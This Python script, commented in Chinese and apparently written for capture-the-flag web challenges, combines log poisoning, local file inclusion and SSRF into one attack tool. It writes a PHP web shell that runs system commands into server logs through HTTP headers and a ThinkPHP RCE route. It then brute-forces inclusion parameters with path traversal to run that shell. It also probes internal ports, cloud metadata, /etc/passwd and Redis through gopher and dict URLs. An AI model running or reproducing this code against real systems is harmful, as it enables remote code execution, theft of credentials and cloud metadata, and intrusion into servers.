#!/usr/bin/env python3
"""
日志注入 + SSRF 组合利用工具
子命令:
  log-poison <target>            # 写恶意内容到 access/error log
  log-include <target> <log-path> # 包含日志 + 执行 php
  ssrf-scan  <target> ?url=      # 探测 SSRF (内网地址/协议)
  redis-rce <target> ?url=       # SSRF + Redis 未授权写马
"""
import requests, argparse, re, sys, time, base64

TIMEOUT = 10

def cmd_log_poison(args):
    target = args.target.rstrip("/")
    print(f"[*] 日志投毒到 {target}")
    # User-Agent/Referer/X-Forwarded-For 写入 PHP 代码
    evil = "<?php if(isset($_GET['x'])){system($_GET['x']);}if(isset($_GET['f'])){echo file_get_contents($_GET['f']);}?>"
    for _ in range(10):
        for key in ("User-Agent", "Referer", "X-Forwarded-For", "X-Custom-IP"):
            try:
                requests.get(f"{target}/index.php?x=_{int(time.time()*1000)}", headers={key: evil}, timeout=TIMEOUT)
            except: pass
        # 用 TP RCE 写内容
        try:
            requests.get(f"{target}/index.php?s=/Index/index/name/{evil}", timeout=TIMEOUT)
        except: pass
        time.sleep(0.05)
    print("[✓] 已写入日志. 下一步: log-include")

def cmd_log_include(args):
    target = args.target.rstrip("/")
    logpath = args.log_path
    print(f"[*] 包含日志: {target}?param={logpath}")
    # 探测常见包含参数
    params = ["file", "page", "tpl", "template", "path", "include", "require", "theme", "view", "skin"]
    log_paths = [logpath]
    # 补充常见路径
    today = time.strftime("%y_%m_%d")
    log_paths += [
        f"Runtime/Logs/Home/{today}.log", f"App/Runtime/Logs/Home/{today}.log",
        f"Runtime/Logs/{today}.log", f"App/Runtime/Logs/{today}.log",
        "../../../var/log/apache2/access.log", "../../../var/log/nginx/access.log",
        "../../var/log/apache2/error.log",
    ]
    include_urls = []
    for p in params:
        for lp in log_paths:
            # 各种路由形式
            include_urls.append(f"{target}/index.php?{p}={lp}")
            include_urls.append(f"{target}/index.php?m=Home&c=Index&a=index&{p}={lp}")
    for url in include_urls[:40]:
        try:
            r = requests.get(url, timeout=TIMEOUT, params={"f":"/flag"})
            if "flag{" in r.text:
                print(f"  🏳️  FLAG: {re.search(r'flag\\{[^}]+\\}', r.text).group()}")
                print(f"      URL: {url}&f=/flag")
                return
            if "system_" in r.text or "x]" in r.text:
                print(f"  [+] 包含成功! {url}")
        except: pass

def cmd_ssrf_scan(args):
    target = args.target.rstrip("/")
    param = args.param
    print(f"[*] SSRF 探测: {target}?{param}=<URL>")
    probes = [
        "http://127.0.0.1/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9090/",
        "http://127.0.0.1:50070/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "file:///flag",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ]
    for probe in probes:
        try:
            r = requests.get(f"{target}/index.php", params={param: probe}, timeout=TIMEOUT)
            if r.status_code != 500 and ("root:" in r.text or "INFO" in r.text or "redis_version" in r.text or "flag{" in r.text):
                print(f"  [+] {probe[:60]}  →  len={len(r.text)}")
                if "flag{" in r.text: print(f"      FLAG: {re.search(r'flag\\{[^}]+\\}', r.text).group()}")
        except: pass

def main():
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("log-poison")
    p1.add_argument("target")
    p1.set_defaults(func=cmd_log_poison)

    p2 = sub.add_parser("log-include")
    p2.add_argument("target")
    p2.add_argument("log_path", default="Runtime/Logs/Home/26_08_06.log", nargs="?")
    p2.set_defaults(func=cmd_log_include)

    p3 = sub.add_parser("ssrf-scan")
    p3.add_argument("target")
    p3.add_argument("param", default="url", help="URL 参数名, 如 ?url=xxx")
    p3.set_defaults(func=cmd_ssrf_scan)

    args = parser.parse_args()
    args.func(args)

if __name__ == "__main__":
    main()
